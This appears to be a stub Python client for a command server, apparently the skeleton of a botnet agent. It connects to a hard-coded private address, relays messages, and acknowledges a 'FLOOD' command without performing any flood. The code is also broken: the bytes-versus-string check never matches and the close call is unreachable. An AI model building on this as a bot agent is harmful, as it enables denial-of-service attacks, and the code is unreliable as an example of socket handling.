import socket, sys, os, time
from scapy.all import *

soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
host = '192.168.128.11'
key = "161718"
port =  5050
load = ['/', '-', '\\', '|']

while True:
    resk = soc.connect_ex((host, port))
    if resk == 0:
        os.system('cls')
        break
    else:
        os.system('cls')
        for i in range(len(load)):
            sys.stdout.write(f"\rConnecting {load[i]}")
try:
    soc.connect((host, port))
except socket.error as e:
    pass

resp = soc.recv(2048)
print('John: '+resp.decode('utf-8'))
while True:
    try:
        resp = soc.recv(2048)
        emp = resp.split()
        try:
            if emp[1] == "FLOOD" or emp[1] == "FLOOD".lower():
                soc.send(str.encode("OK"))
        except IndexError:
            print("John: "+resp.decode('utf-8'))
    except ConnectionResetError:
        print("John: The server has been shutdown...")
        sys.exit()
soc.close()